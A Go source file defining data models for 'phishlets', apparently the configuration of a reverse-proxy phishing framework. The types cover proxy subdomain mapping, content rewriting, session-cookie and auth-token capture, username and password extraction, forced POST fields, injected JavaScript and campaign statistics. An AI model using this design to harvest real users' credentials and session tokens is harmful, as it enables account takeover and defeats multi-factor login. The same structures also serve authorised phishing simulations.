package models

import (
	"time"
)

type Phishlet struct {
	ID               string            `json:"id" db:"id"`
	Name             string            `json:"name" db:"name"`
	DisplayName      string            `json:"display_name" db:"display_name"`
	Author           string            `json:"author" db:"author"`
	Version          string            `json:"version" db:"version"`
	Description      string            `json:"description" db:"description"`
	RedirectURL      string            `json:"redirect_url" db:"redirect_url"`
	ProxyHosts       []ProxyHost       `json:"proxy_hosts" db:"proxy_hosts"`
	Domains          []string          `json:"domains" db:"domains"`
	SubFilters       []SubFilter       `json:"sub_filters" db:"sub_filters"`
	AuthTokens       []AuthToken       `json:"auth_tokens" db:"auth_tokens"`
	AuthUrls         []string          `json:"auth_urls" db:"auth_urls"`
	Credentials      *Credentials      `json:"credentials" db:"credentials"`
	ForcePosts       []ForcePost       `json:"force_posts" db:"force_posts"`
	LandingPath      []string          `json:"landing_path" db:"landing_path"`
	Login            *Login            `json:"login" db:"login"`
	JsInjects        []JsInject        `json:"js_injects" db:"js_injects"`
	Intercepts       []Intercept       `json:"intercepts" db:"intercepts"`
	CustomParams     map[string]string `json:"custom_params" db:"custom_params"`
	IsTemplate       bool              `json:"is_template" db:"is_template"`
	IsEnabled        bool              `json:"is_enabled" db:"is_enabled"`
	IsVisible        bool              `json:"is_visible" db:"is_visible"`
	Hostname         string            `json:"hostname" db:"hostname"`
	UnauthURL        string            `json:"unauth_url" db:"unauth_url"`
	CreateTime       time.Time         `json:"create_time" db:"create_time"`
	UpdateTime       time.Time         `json:"update_time" db:"update_time"`
}

type ProxyHost struct {
	PhishSubdomain string `json:"phish_subdomain" db:"phish_subdomain"`
	OrigSubdomain  string `json:"orig_subdomain" db:"orig_subdomain"`
	Domain         string `json:"domain" db:"domain"`
	HandleSession  bool   `json:"handle_session" db:"handle_session"`
	IsLanding      bool   `json:"is_landing" db:"is_landing"`
	AutoFilter     bool   `json:"auto_filter" db:"auto_filter"`
}

type SubFilter struct {
	Subdomain     string   `json:"subdomain" db:"subdomain"`
	Domain        string   `json:"domain" db:"domain"`
	Mime          []string `json:"mime" db:"mime"`
	Regexp        string   `json:"regexp" db:"regexp"`
	Replace       string   `json:"replace" db:"replace"`
	RedirectOnly  bool     `json:"redirect_only" db:"redirect_only"`
	WithParams    []string `json:"with_params" db:"with_params"`
}

type AuthToken struct {
	Domain    string `json:"domain" db:"domain"`
	Name      string `json:"name" db:"name"`
	Type      string `json:"type" db:"type"`
	Path      string `json:"path,omitempty" db:"path"`
	Search    string `json:"search,omitempty" db:"search"`
	Header    string `json:"header,omitempty" db:"header"`
	HttpOnly  bool   `json:"http_only" db:"http_only"`
	Optional  bool   `json:"optional" db:"optional"`
	Always    bool   `json:"always" db:"always"`
}

type Credentials struct {
	Username *PostField   `json:"username" db:"username"`
	Password *PostField   `json:"password" db:"password"`
	Custom   []PostField  `json:"custom" db:"custom"`
}

type PostField struct {
	Type   string `json:"type" db:"type"`
	Key    string `json:"key" db:"key"`
	Search string `json:"search" db:"search"`
}

type ForcePost struct {
	Path   string            `json:"path" db:"path"`
	Search []ForcePostSearch `json:"search" db:"search"`
	Force  []ForcePostForce  `json:"force" db:"force"`
	Type   string            `json:"type" db:"type"`
}

type ForcePostSearch struct {
	Key    string `json:"key" db:"key"`
	Search string `json:"search" db:"search"`
}

type ForcePostForce struct {
	Key   string `json:"key" db:"key"`
	Value string `json:"value" db:"value"`
}

type Login struct {
	Domain string `json:"domain" db:"domain"`
	Path   string `json:"path" db:"path"`
}

type JsInject struct {
	ID             string   `json:"id" db:"id"`
	TriggerDomains []string `json:"trigger_domains" db:"trigger_domains"`
	TriggerPaths   []string `json:"trigger_paths" db:"trigger_paths"`
	TriggerParams  []string `json:"trigger_params" db:"trigger_params"`
	Script         string   `json:"script" db:"script"`
}

type Intercept struct {
	Domain     string `json:"domain" db:"domain"`
	Path       string `json:"path" db:"path"`
	HttpStatus int    `json:"http_status" db:"http_status"`
	Body       string `json:"body" db:"body"`
	Mime       string `json:"mime" db:"mime"`
}

type PhishletStats struct {
	TotalPhishlets   int `json:"total_phishlets"`
	EnabledPhishlets int `json:"enabled_phishlets"`
	ActiveCampaigns  int `json:"active_campaigns"`
}
